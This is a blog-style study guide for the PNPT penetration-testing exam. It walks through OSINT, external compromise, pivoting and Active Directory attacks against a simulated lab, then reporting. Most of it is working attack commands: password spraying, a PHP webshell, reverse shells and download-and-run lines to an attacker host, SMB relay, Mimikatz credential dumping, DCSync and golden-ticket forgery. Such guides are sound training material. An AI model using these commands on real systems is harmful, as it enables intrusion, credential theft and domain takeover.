---
title: "PNPT Field Guide: How I Think Through Every Phase of the Exam"
date: "2025-12-01"
description: "A real walkthrough of the PNPT exam — every phase, every tool, every decision point. Written the way I wish someone had written it for me."
tags: ["pnpt", "penetration-testing", "active-directory", "red-team", "certification"]
---

## Before Anything Else — What the PNPT Actually Is

The PNPT is a practical exam by TCM Security. Five days to compromise a network, two days to write a professional report, then a 15-minute live debrief where you explain your findings to an examiner. No multiple choice, no browser-based VM, no flag submission. You work on your own machine, against a real simulated environment, and you document everything the way you would on an actual engagement.

That's the part that sold me. Most certs test whether you memorized something. This one tests whether you can actually do the job.

To pass you need to run OSINT, compromise an external machine, pivot into the internal network, work through Active Directory, reach Domain Admin, and then write a report that a client could actually read and act on. The technical skill matters. The reporting matters. The ability to explain what you did in plain language to a non-technical stakeholder matters. All three get tested.

I came into this after building real lab environments, completing the TCM course material across Practical Ethical Hacking, OSINT, and the External Pentest Playbook, and grinding HTB and THM machines until the methodology started feeling automatic. I'm not doing this to collect a cert. I'm doing it because I want to know I can run a real internal network pentest from start to report.
What follows is every tool, command, and decision point I work through across the full exam flow — written the way I wish someone had written it before I started.


The exam costs $399 and that includes the study material. You get 5 days to compromise the domain and 2 days to write the report. Seven days total.


The exam tests your hacker mindset as much as your technical skill. Reconnaissance is the key. Every time I've gotten stuck during practice, it was because I rushed past something in the enumeration phase. The answer was always there — I just didn't look long enough.


The debriefing stage — where you explain how you compromised the domain after submitting the report — is straightforward if you did the work. Talk through what you found, what you exploited, and how. Anyone who completed both the exam and the report can handle it.

Would I recommend it? If you want to prove you can actually pentest — yes. If getting hired is the only goal and you can afford OSCP, that cert opens more doors. If you can't afford OSCP yet, PNPT is a legitimate alternative and the skills you build for it are real.

## How the Whole Thing Flows

```
OSINT  →  External Attack  →  Shell on External Machine
                                        ↓
                              Ligolo Pivot Into Internal Network
                                        ↓
                              Internal AD Enumeration
                                        ↓
                              AD Attacks → Domain Admin
                                        ↓
                              Screenshots → Report
```

## Phase 1 — OSINT

The goal here is specific: find employee names, figure out the email format, generate a username list, build a password wordlist, identify login portals. That's it. Don't spend more than 45 minutes here.

The exam environment is simulated. You won't find real breach data on HaveIBeenPwned for the exam domain. What you will find is a company website with employee names and job titles. That's your raw material.

What you're hunting: full names from the About/Team page, the corporate email format, any exposed login portals (OWA, VPN portal, custom web apps), and subdomains.

```bash
theHarvester -d target.com -b all -l 500
subfinder -d target.com
assetfinder target.com | grep target.com | sort -u
amass enum -d target.com
whois target.com

# Check which subdomains are alive:
cat subdomains.txt | httprobe -prefer-https | grep https

# crt.sh in browser: https://crt.sh → search %.target.com
```

Check the team page manually. Collect every full name and title you see. Then generate every possible username format from those names:

```bash
git clone https://github.com/urbanadventurer/username-anarchy
cd username-anarchy
./username-anarchy --input-file names.txt --select-format first,flast,first.last,firstl > usernames.txt
```

From "John Smith" that gives you: `john`, `jsmith`, `john.smith`, `johns`, `smithj`, `johnsmith`, `j.smith`. One of those is the real format used in the domain.

For passwords, build a pattern list using corporate conventions. Don't overthink it:

```
CompanyName2024!
CompanyName2023!
Welcome1
Password1
Summer2024!
Winter2024!
Company@2024
```

TCM may provide a wordlist. If they do, use it — but check lockout policy before spraying anything.

For Google dorking, these are the ones that actually produce results:

```
site:target.com
site:target.com -www
site:target.com filetype:pdf
"@target.com" filetype:txt
intitle:"index of" site:target.com
"target.com" "password" filetype:pdf
```

For breach data (won't have exam creds, but run it as methodology practice):

```bash
# Dehashed: https://dehashed.com → search by @domain.com
# HaveIBeenPwned: https://haveibeenpwned.com
h8mail -t user@target.com
```

For social media — LinkedIn is the most useful. Search the company, go to the Employees tab, collect names and titles especially from IT roles.

```bash
sherlock username
whatsmyname -u username
```

**OSINT checklist before moving on:**
- theHarvester run against the domain
- Team/About page manually reviewed, full names collected
- Username list generated with Username Anarchy
- Password wordlist built with corporate patterns
- Subdomains enumerated via subfinder, assetfinder, crt.sh
- whois done
- All login portals identified
- Breach databases checked

## Phase 2 — External Pentest

Get a shell on the external machine. That's the only goal of this entire phase.

Start with a full port scan. Don't skip ports — the interesting stuff is often on non-standard ones:

```bash
nmap -A -p- -T4 -Pn TARGET -v -oN scan_results.txt

# Quick scan on high-value ports while full scan runs:
nmap -sV -sC -p 21,22,23,25,53,80,443,445,3389,5985,8080,8443 TARGET

# UDP (SNMP lives here):
nmap -sU -p 161,162,500 TARGET
```

Port 21 means try anonymous FTP. Port 22 means try default or weak SSH creds. Ports 80/443 mean browse it manually and run gobuster. Port 445 means try anonymous SMB access. Port 3389 means try RDP if you have creds. Port 5985 means WinRM — if you get creds this is often how you get a clean shell. Ports 8080/8443 often hide Jenkins, Tomcat, or admin panels. Port 161 UDP means SNMP — try the "public" community string.

### Attacking Login Portals

Check lockout policy before spraying anything. Test one obviously wrong password against one account. If it locks after one attempt, find another path.

For O365:

```bash
trevorspray -u emails.txt -p 'Winter2024!' --ms-graph
```

Read the error messages carefully. "That account doesn't exist" means invalid user — remove them from your list. "Your account or password is incorrect" means valid user, wrong password — keep them. "Device not in required state" means valid credentials with MFA or a device policy blocking you. Different error responses tell you completely different things.

For OWA:

```bash
msfconsole
use auxiliary/scanner/http/owa_login
set RHOSTS mail.target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
set DOMAIN target.com
run
```

For other portals, Burp Suite Intruder works well. Intercept the login POST, send to Intruder, mark only the password field, load your wordlist, and set a grep match on the failure string. Any request that doesn't contain that string is a successful login.

For MFA bypass, MFASweep checks which Microsoft endpoints skip MFA enforcement even when it's "enabled" — things like ActiveSync and EWS sometimes don't enforce it:

```bash
Invoke-MFASweep -Username user@target.com -Password 'Password1'
```

### Getting the Shell

**Valid creds + WinRM open (port 5985):**

```bash
crackmapexec winrm TARGET_IP -u username -p 'Password1'
# If (Pwn3d!) appears:
evil-winrm -i TARGET_IP -u username -p 'Password1'
```

Once you're in: `whoami`, `hostname`, `ipconfig /all`. Look for two network interfaces. The second one is your path into the internal network. Screenshot everything immediately.

**Valid creds + SMB (port 445):**

```bash
crackmapexec smb TARGET_IP -u username -p 'Password1'
# (Pwn3d!) = local admin
impacket-psexec domain.local/username:'Password1'@TARGET_IP
```

If psexec fails (firewall, AV), try these in order:

```bash
impacket-wmiexec domain.local/username:'Password1'@TARGET_IP
impacket-smbexec domain.local/username:'Password1'@TARGET_IP
```

**SSH (port 22):**

```bash
ssh username@TARGET_IP

# With a private key you found:
chmod 600 id_rsa
ssh -i id_rsa username@TARGET_IP
```

**SQL injection on the login page:**

Test these in the username field:

```
' OR 1=1--
' OR '1'='1
admin'--
```

If you bypass login, look for file upload in the admin panel. Upload a webshell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Test it:

```bash
curl "http://TARGET/uploads/shell.php?cmd=whoami"
```

If you see command output, RCE is confirmed. Set up your listener and trigger a reverse shell:

```bash
nc -lvnp 4444

curl "http://TARGET/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/KALI_IP/4444+0>%261'"
```

If `.php` is blocked on upload, try: `.phtml`, `.php5`, `.php7`. Or intercept in Burp and change the Content-Type header to `image/jpeg` while keeping the `.php` extension. After the bypass is confirmed and the file is uploaded, set up the netcat listener first, then trigger the shell via curl.

**Command injection:**

Test these in any field that seems to run OS commands:

```bash
127.0.0.1; whoami
127.0.0.1 | whoami
127.0.0.1 || whoami
127.0.0.1 && whoami
`whoami`
```

Confirm blind injection by making the target ping you:

```bash
# Inject: 127.0.0.1; ping -c 1 KALI_IP
# On Kali:
tcpdump -i tun0 icmp
```

If you see ICMP coming in, the machine can reach you. Set up your listener then trigger the reverse shell the same way.

**Jenkins Script Console (no auth or default creds):**

Navigate to Manage Jenkins → Script Console. Test RCE first:

```groovy
println "whoami".execute().text
```

If you get output, you have RCE. Set up a netcat listener on Kali:

```bash
nc -lvnp 4444
```

For a Linux target, trigger the reverse shell directly:

```groovy
def cmd = ["bash", "-c", "bash -i >& /dev/tcp/KALI_IP/4444 0>&1"]
cmd.execute()
```

For a Windows target, host a PowerShell reverse shell script on Kali (`python3 -m http.server 80`) and pull it down:

```groovy
def cmd = ["cmd.exe", "/c", "powershell -c \"IEX(New-Object Net.WebClient).downloadstring('http://KALI_IP/rev.ps1')\""]
cmd.execute()
```

**Redis (no auth):**

```bash
redis-cli -h TARGET_IP ping
# PONG = unauthenticated access

# Write SSH public key to get root:
ssh-keygen -t rsa -f /tmp/redis_key -N ""
(echo -e "\n\n"; cat /tmp/redis_key.pub; echo -e "\n\n") > /tmp/spaced_key.txt
cat /tmp/spaced_key.txt | redis-cli -h TARGET_IP -x set pwned
redis-cli -h TARGET_IP config set dir /root/.ssh
redis-cli -h TARGET_IP config set dbfilename authorized_keys
redis-cli -h TARGET_IP bgsave
ssh -i /tmp/redis_key root@TARGET_IP
```

**Anonymous FTP:**

```bash
ftp TARGET_IP
# Username: anonymous  Password: (blank or any@email.com)
ftp> ls -la
ftp> mget *
```

After downloading everything, search for credentials:

```bash
grep -ri "password\|passwd\|secret\|key\|token" .
```

Focus on: `web.config`, `.env`, `appsettings.json`, backup SQL files, `id_rsa`, `config.php`.

**Anonymous SMB:**

```bash
smbmap -H TARGET_IP
smbclient -L //TARGET_IP -N
smbclient //TARGET_IP/sharename -N
# Inside smbclient:
smb: \> recurse
smb: \> ls
smb: \> mget *
```

If you find `Groups.xml`:

```bash
gpp-decrypt HASH_FROM_CPASSWORD_FIELD
```

**SNMP:**

```bash
snmpwalk -v2c -c public TARGET_IP system
snmpwalk -v2c -c public TARGET_IP > snmp_dump.txt
snmp-check TARGET_IP -c public
```

Check running process command lines — sometimes credentials are passed as arguments to backup scripts or services:

```bash
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.25.4.2.1.5
```

**Exposed .git directory:**

```bash
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/big.txt
# /.git (Status: 200) → exposed

git-dumper http://TARGET/.git/ ./repo
cd repo
git log --oneline
git show COMMIT_HASH
grep -r "password\|secret\|key\|token" .
```

Look at commits with messages like "remove credentials" or "cleanup config" — the deleted content (lines starting with `-`) often contains the credentials that were removed.

**Stabilizing a Linux shell after netcat:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z to background
stty raw -echo; fg
# Press Enter twice
export TERM=xterm
```

**External checklist before moving on:**
- Full Nmap scan completed
- All open ports researched
- Web app browsed manually
- Gobuster run
- Login portal found
- Lockout policy checked before any spray
- Password spray attempted
- Web app attacks tried (SQLi, CMDi, file upload, default creds)
- Shell obtained
- `whoami`, `hostname`, `ipconfig` screenshotted
- Dual NIC confirmed — internal IP noted

## Phase 3 — Pivot With Ligolo-ng

You have a shell on the external machine. Internal machines are behind it. You need to route your Kali traffic through the foothold to reach them.

Ligolo creates a real TUN interface on Kali — so you don't need proxychains on every command. Tools work at full speed as if the internal network is directly connected.

```bash
# On Kali — create the TUN interface:
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# Start the proxy:
./proxy -selfcert -laddr 0.0.0.0:11601

# Host the agent for transfer:
python3 -m http.server 80

# Download agent on Windows target:
certutil -urlcache -f http://KALI_IP/agent.exe agent.exe
# Or via evil-winrm:
upload agent.exe

# Download agent on Linux target:
wget http://KALI_IP/agent -O agent && chmod +x agent

# Run the agent on target (Windows):
.\agent.exe -connect KALI_IP:11601 -ignore-cert

# Run the agent on target (Linux):
./agent -connect KALI_IP:11601 -ignore-cert

# Back in Ligolo proxy console — select session and start:
session
# Press Enter to select
start

# Add route to internal network on Kali:
sudo ip route add 192.168.10.0/24 dev ligolo
# Replace subnet with whatever you found in ipconfig on the foothold

# Test it — no proxychains needed:
nmap -sT -Pn 192.168.10.1
```

What works and what doesn't through the Ligolo tunnel: nmap works (use `-sT` not SYN scan), crackmapexec works, netexec works, all impacket tools work, evil-winrm works, bloodhound-python works. Responder does NOT work — it relies on broadcast traffic and can't reach the internal broadcast domain through a tunnel. Same for mitm6.

If you need Responder, upload it to the pivot machine and run it on the internal interface there:

```bash
python3 Responder.py -I eth1 -wrf
# eth1 = the interface with the internal IP
```

Hashes captured on the pivot machine — copy them back to Kali and crack with hashcat.

### Catching Reverse Shells From Internal Hosts

When an internal host needs to send a reverse shell back to you, the foothold acts as a relay. The internal machine can reach the foothold, the foothold relays through Ligolo to your Kali.

```bash
# In the Ligolo proxy console on your active session:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# Start netcat listener on Kali:
nc -lvnp 4444

# Trigger reverse shell on internal target, pointing to foothold's INTERNAL IP:
bash -i >& /dev/tcp/FOOTHOLD_INTERNAL_IP/4444 0>&1

# Manage listeners:
listener_list
listener_stop --id 0
```

## Phase 4 — Internal AD Enumeration

You're on the internal network. Before attacking anything, enumerate. The more you know before attacking, the less time you waste guessing at dead ends.

**Find all alive hosts:**

```bash
crackmapexec smb 192.168.10.0/24
nmap -sT -Pn -p 445 192.168.10.0/24 --open
```

**Identify the DC — port 88 (Kerberos) and 389 (LDAP) together mean DC:**

```bash
nmap -sT -Pn -p 88,389,636 192.168.10.0/24 --open
nmap -sT -Pn -p 88,389,445,53,3268 192.168.10.1 -sV
```

**Full scans on key machines:**

```bash
sudo nmap -T4 -sV -A -Pn 192.168.10.1 -oN dc_scan.txt
sudo nmap -T4 --top-ports 100 -v 192.168.10.10
nmap -p- -A -T4 192.168.10.10
```

**Enumerate without credentials:**

```bash
# SMB null session:
smbmap -H DC_IP
smbclient -L //DC_IP -N
smbclient //DC_IP/sharename -N

# RPC null session:
rpcclient -U "" -N DC_IP
# Inside rpcclient:
enumdomusers
enumdomgroups
queryuser 0x1f4
netshareenumall

# LDAP anonymous bind:
netexec ldap DC_IP -u '' -p '' --users
ldapsearch -x -H ldap://DC_IP -b 'dc=domain,dc=local'
```

In ldapsearch output, look for users with `DONT_REQ_PREAUTH` in their `userAccountControl` value (AS-REP roastable), accounts with `servicePrincipalName` set (Kerberoastable), and anything written in the description field — admins sometimes store passwords there.

**Validate usernames with kerbrute (no password needed):**

```bash
kerbrute userenum potential_users.txt -d domain.local --dc DC_IP
```

**RID brute to enumerate users by SID:**

```bash
netexec smb DC_IP -u '' -p '' --rid-brute
lookupsid.py domain.local/guest@DC_IP
```

**Full LDAP dump with credentials:**

```bash
ldapdomaindump -u 'domain.local\username' -p 'password' ldap://DC_IP
ldapdomaindump ldaps://DC_IP -u 'DOMAIN\username' -p password
```

Opens as HTML in Firefox. `domain_users_by_group.html` shows every user and their group memberships. `domain_computers.html` shows all machines. `domain_trusts.html` shows trust relationships. This is your targeting list.

**SMB shares enumeration:**

```bash
smbmap -u username -p 'password' -H DC_IP
smbmap -u username -p 'password' -H DC_IP -r sharename

smbclient //DC_IP/sharename -U 'domain\username'
# Inside smbclient:
smb: \> recurse
smb: \> ls
smb: \> get filename.txt
```

Check SYSVOL specifically — GPP credentials live here:

```bash
smbclient //DC_IP/SYSVOL -U 'domain\username'
smb: \> recurse
smb: \> ls
# Look for: Groups.xml, Services.xml, ScheduledTasks.xml
```

**Password spray — check lockout policy first:**

```bash
crackmapexec smb DC_IP -u username -p password --pass-pol

crackmapexec smb 192.168.10.0/24 -u users.txt -p 'Password1'
netexec smb 192.168.10.0/24 -u 'domain\said' -p 'password123$'
netexec winrm 192.168.10.0/24 -u users.txt -p 'Password1'
kerbrute passwordspray -d domain.local --dc DC_IP users.txt 'Password1'

# If you have user+pass combos:
netexec smb 192.168.10.0/24 -u users.txt -p passwords.txt --continue-on-success

# Dump SAM if you find a domain admin password:
netexec smb 192.168.10.0/24 -u administrator -p 'Password1' --sam
```

`(Pwn3d!)` means local admin on that machine. `[+]` without Pwn3d means valid creds but no admin — enumerate that user, don't try to shell.

**BloodHound — run this before deciding any attack path:**

From Kali with domain creds:

```bash
bloodhound-python -u username -p 'password' -d domain.local -dc DC_IP -ns DC_IP -c All
zip -r loot.zip *.json

sudo neo4j console
bloodhound
# Drag and drop loot.zip into BloodHound
```

From inside a Windows machine (SharpHound):

```bash
upload SharpHound.exe
.\SharpHound.exe -c All --domain domain.local --zipfilename loot.zip
download loot.zip
```

Run these BloodHound queries in order: Find Shortest Paths to Domain Admins, Find Principals with DCSync Rights, List All Kerberoastable Accounts, Find AS-REP Roastable Users, then Shortest Paths from Owned Principals after you start marking compromised users as Owned.

The BloodHound edges that matter most: GenericAll means full control — you can reset passwords, add to groups, do anything. WriteDACL means you can modify permissions and grant yourself DCSync rights. GenericWrite lets you modify object properties — useful for adding an SPN to an account for Kerberoasting. WriteOwner lets you take ownership of an object and then change its ACL. AllExtendedRights can enable force password resets or DCSync if set on the domain object. AdminTo means local admin on that specific machine.

**File sharing between machines:**

```bash
# Host from Kali:
python3 -m http.server 80

# SMB server for Windows targets:
impacket-smbserver share . -ts -debug -smb2support
# On victim: net use \\KALI_IP\share
# copy \\KALI_IP\share\SharpHound.exe .

# Authenticated SMB (more reliable):
impacket-smbserver -username user -password pass share /path -smb2support
# On victim: net use \\KALI_IP\share /u:user pass
```

**AD enumeration checklist:**
- DC IP and domain name confirmed
- Host discovery done — all internal IPs found
- Full Nmap scan on DC
- SMB null session tested
- RPC null session tested
- LDAP anonymous bind tested
- Usernames validated with kerbrute
- crackmapexec sweep done
- Password spray done carefully
- BloodHound collected and imported
- ldapdomaindump run
- All accessible shares enumerated
- SYSVOL checked for GPP creds
- AS-REP Roasting checked
- Kerberoasting checked
- Certipy run

## Phase 5 — Initial AD Attack Vectors

You're on the network. Now you get your first domain credential.

### LLMNR Poisoning

Windows falls back to LLMNR broadcast when DNS fails. You answer the broadcast and capture NTLMv2 hashes. This is passive — you're just listening.

```bash
sudo responder -I eth0 -wdv
```

Run this from a machine physically on the internal subnet. If you're going through Ligolo, upload Responder to the pivot machine and run it on the internal interface. Hashes appear in the output — save them to a file and crack with hashcat.

### SMB Relay

Instead of cracking the NTLMv2 hash, you relay it to another machine and authenticate as that user. Requirements: SMB signing must be disabled on the target, and the relayed user must be local admin there.

```bash
# Find relay targets:
nmap --script=smb2-security-mode.nse -p445 192.168.10.0/24
# "message signing enabled but not required" = exploitable → add to targets.txt

# Edit Responder config:
vim /etc/responder/Responder.conf
# Set: SMB = Off   HTTP = Off

# Run Responder (listening but not responding to SMB/HTTP):
sudo responder -I eth0 -dwP

# Run the relay:
sudo ntlmrelayx.py -tf targets.txt -smb2support
# Success → dumps SAM hashes from the target machine

# For interactive shell instead of hash dump:
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
nc 127.0.0.1 11000

# For direct command execution:
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

### IPv6 — mitm6

Must run from a machine on the internal broadcast domain. Same constraint as Responder.

```bash
mitm6 -d domain.local

# Simultaneously:
ntlmrelayx.py -6 -t ldaps://DC_IP -wh fakewpad.domain.local -l lootme
```

Wait for a user to log in or reboot a Windows machine. The lootme folder fills with domain data.

### Pass-Back Attack (Printers)

Browse to a printer's web interface. Find the LDAP or SMB authentication settings. Replace the configured server IP with your Kali IP. Start Responder on Kali. When the printer makes its next authentication attempt, you capture credentials without anyone clicking anything.

### AS-REP Roasting

Users with no pre-authentication required — you request a ticket for them without their password, then crack the hash offline.

```bash
impacket-GetNPUsers domain.local/ -dc-ip DC_IP -usersfile users.txt -no-pass -format hashcat
impacket-GetNPUsers domain.local/said -no-pass -dc-ip DC_IP

hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
john asrep.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep
```

### Kerberoasting

Service accounts with SPNs — you request their service ticket and crack it offline. Needs at least one domain user account.

```bash
impacket-GetUserSPNs domain.local/username:password -dc-ip DC_IP -request

# Clock skew error:
sudo ntpdate DC_IP

hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
john kerb.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs
```

### GPP Credentials

Old Group Policy Preferences files stored encrypted passwords in SYSVOL. Every domain user can read SYSVOL. Microsoft published the encryption key. This is a free credential if it exists.

```bash
smbclient //DC_IP/SYSVOL -U 'domain\username'
smb: \> recurse
smb: \> ls
# Find Groups.xml
smb: \> get Policies\{GUID}\Machine\Preferences\Groups\Groups.xml

gpp-decrypt ENCRYPTED_STRING
```

### URL File Attack

Create a file called `@attack.url` and drop it into a network share that users browse. The `@` puts it at the top alphabetically so it loads the moment someone opens the folder.

```
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\KALI_IP\%USERNAME%.icon
IconIndex=1
```

When a user opens the folder in Windows Explorer, it automatically tries to load the icon from your Kali machine. That triggers an NTLM authentication attempt. Responder catches the NTLMv2 hash without the user clicking anything.

## Phase 6 — Post-Compromise Attacks

You have credentials — either a password or a hash. Now you move laterally.

### Pass the Password

```bash
crackmapexec smb 192.168.10.0/24 -u username -d domain.local -p 'Password1'
```

### Pass the Hash

NTLM hashes from secretsdump can be used directly — you don't need to crack them first.

```bash
crackmapexec smb 192.168.10.0/24 -u administrator -H NTLM_HASH --local-auth
impacket-psexec administrator@TARGET_IP -hashes :NTLM_HASH
impacket-wmiexec domain.local/username@TARGET_IP -hashes :NTLM_HASH
impacket-smbexec domain.local/username@TARGET_IP -hashes :NTLM_HASH
evil-winrm -i TARGET_IP -u username -H NTLM_HASH
```

psexec drops a service on the target — it's noisier. wmiexec is stealthier. If psexec fails, try wmiexec first before assuming you don't have access.

### Dumping Hashes

```bash
# From Kali:
impacket-secretsdump domain.local/username:password@TARGET_IP
impacket-secretsdump domain.local/administrator@TARGET_IP -hashes :NTLM_HASH

# crackmapexec options:
crackmapexec smb TARGET_IP -u admin -H HASH --local-auth --sam
crackmapexec smb TARGET_IP -u admin -H HASH --local-auth --lsa
crackmapexec smb TARGET_IP -u admin -H HASH --local-auth -M lsassy

# Mimikatz on the victim machine:
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::lsa /patch
```

What secretsdump gives you: SAM hashes are local user accounts on that specific machine. LSA secrets are cached credentials from users who logged into that machine. NTDS.dit — when you run secretsdump against the DC — gives you every domain hash.

### Cracking Hashes

The hash type determines the hashcat mode and whether you can pass it without cracking.

NTLM hashes (from secretsdump, SAM, hashdump) use mode 1000 and can be passed directly without cracking. These are the NT hashes — the fourth field in secretsdump output before the `:::`.

NetNTLMv2 hashes (from Responder) use mode 5600 and cannot be passed — you must crack them to get the plaintext password first.

NetNTLMv1 hashes (from older systems) use mode 5500, also cannot be passed.

Kerberos TGS hashes from Kerberoasting use mode 13100, cannot be passed.

AS-REP hashes use mode 18200, cannot be passed.

```bash
hashcat -m 5600 hashes.txt rockyou.txt     # NetNTLMv2 (Responder)
hashcat -m 1000 hashes.txt rockyou.txt     # NTLM (secretsdump)
hashcat -m 13100 hashes.txt rockyou.txt    # Kerberoasting
hashcat -m 18200 hashes.txt rockyou.txt    # AS-REP Roasting
hashcat -m 5500 hashes.txt rockyou.txt     # NetNTLMv1

john hashes.txt --wordlist=rockyou.txt --format=netntlmv2
john hashes.txt --wordlist=rockyou.txt --format=NT
john kerb.hash --wordlist=rockyou.txt --format=krb5tgs
john asrep.hash --wordlist=rockyou.txt --format=krb5asrep
```

### Token Impersonation

```bash
# In Metasploit Meterpreter:
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"
whoami

# Go back to SYSTEM before dumping hashes:
rev2self
hashdump
```

### WDigest

WDigest is a Windows authentication protocol that stores credentials in memory. On modern Windows it's disabled by default — which means plaintext passwords aren't kept in memory. But if you have admin access, you can enable it and wait for a user to log in again.

First check the current state:

```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
# 0x1 = enabled (plaintext in memory)
# 0x0 = disabled
```

If it's disabled, enable it:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

Now wait for a user to log in or reconnect. Their plaintext credentials go into memory. Then dump with Mimikatz:

```bash
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

You need local admin or SYSTEM to run Mimikatz. You need someone to actually authenticate after you enable WDigest. This is a patience attack — enable it and let time do the work.

## Phase 7 — Path to Domain Admin

### DCSync

DCSync pretends to be a domain controller and requests credential replication from the real DC. You need an account with DCSync rights — Domain Admin has them by default, but BloodHound may show you a path to get them via WriteDACL or AllExtendedRights.

```bash
# From Kali — no shell on DC needed:
impacket-secretsdump domain.local/username:password@DC_IP -just-dc-ntlm

# Via Mimikatz on a machine with DA rights:
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /user:Administrator

# Getting DCSync rights via WriteDACL:
$pass = ConvertTo-SecureString 'YourPassword' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\youruser', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity DOMAIN.local -Rights DCSync
```

### Dumping NTDS.dit

```bash
impacket-secretsdump domain.local/administrator:password@DC_IP -just-dc-ntlm
```

This gives you every hash in the domain. The NT hash is the fourth field before `:::` in the output. Extract just NT hashes for cracking:

```bash
cat secretsdump_output.txt | cut -d: -f4 > nt_hashes.txt
hashcat -m 1000 nt_hashes.txt rockyou.txt
```

### Golden Ticket

You need the krbtgt NTLM hash and the domain SID. Then you forge a Kerberos ticket as any user — including a fake admin — that the DC will accept as valid.

```bash
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
# Note the NTLM hash and SID (S-1-5-21-...)

# Forge the ticket:
kerberos::golden /User:FakeAdmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:NTLM_HASH /id:500 /ptt

misc::cmd
dir \\DC01\C$
psexec.exe \\DC01 cmd.exe
```

### Getting a Shell as Domain Admin

```bash
impacket-psexec domain.local/administrator@DC_IP
impacket-psexec administrator@DC_IP -hashes :NTLM_HASH
impacket-wmiexec domain.local/administrator@DC_IP -hashes :NTLM_HASH
evil-winrm -i DC_IP -u administrator -p 'password'
evil-winrm -i DC_IP -u administrator -H NTLM_HASH
```

## Certificate Attacks — AD CS

Active Directory Certificate Services lets Windows environments issue certificates. When it's misconfigured, a normal domain user can request a certificate for Domain Admin and authenticate as them.

Run this every time you get any domain user credentials. It takes seconds and the payoff when it works is immediate DA.

```bash
pip3 install certipy-ad

# Find vulnerable templates:
certipy find -u username@domain.local -p 'password' -dc-ip DC_IP -vulnerable -stdout
```

Look for ESC1: "Client Authentication" enabled plus `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`. That means you can request a certificate specifying any user — including administrator.

```bash
# Request a cert as Administrator:
certipy req -u username@domain.local -p 'password' -ca CA_NAME -template TEMPLATE_NAME -upn administrator@domain.local -dc-ip DC_IP

# Use the cert to get the Administrator NTLM hash:
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# Get a shell:
evil-winrm -i DC_IP -u administrator -H ADMINISTRATOR_NTLM_HASH
```

In some environments this is three commands from any domain user to Domain Admin. Don't skip it.

## Phase 8 — Post-Domain Compromise

On the DC, run and screenshot all of this together before doing anything else:

```bash
whoami
hostname
ipconfig
type C:\Users\Administrator\Desktop\proof.txt
```

**File transfers:**

```bash
# evil-winrm:
upload SharpHound.exe
download loot.zip

# PowerShell from Kali HTTP server:
powershell -c "IEX(New-Object Net.WebClient).downloadstring('http://KALI_IP/file.ps1')"

# certutil (Windows):
certutil -urlcache -f http://KALI_IP/file.exe file.exe
certutil --split -f -urlcache http://KALI_IP/file.exe

# impacket-smbserver:
impacket-smbserver share . -smb2support
impacket-smbserver -username user -password pass share /path -smb2support
# On victim: net use \\KALI_IP\share /u:user pass
```

## Common Findings

When writing the report, these are the severity ratings you'll assign to what you found.

No account lockout policy is Critical — it means unlimited password spray attempts with no consequence. LLMNR/NBT-NS enabled is Critical — it's what makes Responder work in the first place. SMB signing disabled is Critical — it enables relay attacks. Weak password policy is Critical — short or predictable passwords are what makes spray attacks succeed. DCSync misconfiguration is Critical — a non-admin that can replicate domain credentials effectively has Domain Admin. Kerberoastable service accounts are High — SPN-enabled accounts with weak passwords are offline crackable. AS-REP roastable accounts are High. WDigest enabled is High. AD CS misconfigurations (ESC1 through ESC8) range from High to Critical depending on the template. GPP credentials in SYSVOL are Medium — any domain user can read them, but you still need to be on the domain. Anonymous SMB or FTP access is Medium. Default credentials are Medium. Information disclosure through verbose errors or version banners is Low.

## Tool Quick Reference

```bash
# OSINT
theHarvester -d domain.com -b all -l 500
./username-anarchy --input-file names.txt > usernames.txt
subfinder -d domain.com
amass enum -d domain.com
whois domain.com
sherlock username

# SCANNING
nmap -A -p- -T4 -Pn TARGET -oN scan.txt
nmap -sU -p 161 TARGET
nmap --script=smb2-security-mode.nse -p445 SUBNET
gobuster dir -u http://TARGET -w big.txt -x php,txt,html

# SMB
smbmap -H TARGET
smbclient -L //TARGET -N
smbclient //TARGET/share -U 'domain\username'
crackmapexec smb SUBNET -u user -p pass
netexec smb DC_IP -u '' -p '' --users

# CREDENTIAL ATTACKS
hashcat -m 5600 hash.txt rockyou.txt     # NetNTLMv2
hashcat -m 1000 hash.txt rockyou.txt     # NTLM
hashcat -m 13100 hash.txt rockyou.txt    # Kerberoasting
hashcat -m 18200 hash.txt rockyou.txt    # AS-REP
hashcat -m 5500 hash.txt rockyou.txt     # NetNTLMv1

# AD ENUMERATION
kerbrute userenum users.txt -d domain.local --dc DC_IP
ldapdomaindump -u 'domain\user' -p pass ldap://DC_IP
bloodhound-python -u user -p pass -d domain.local -dc DC_IP -c All
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request
impacket-GetNPUsers domain.local/ -dc-ip DC_IP -usersfile users.txt -no-pass
certipy find -u user@domain.local -p pass -dc-ip DC_IP -vulnerable -stdout

# SHELLS
evil-winrm -i TARGET -u user -p pass
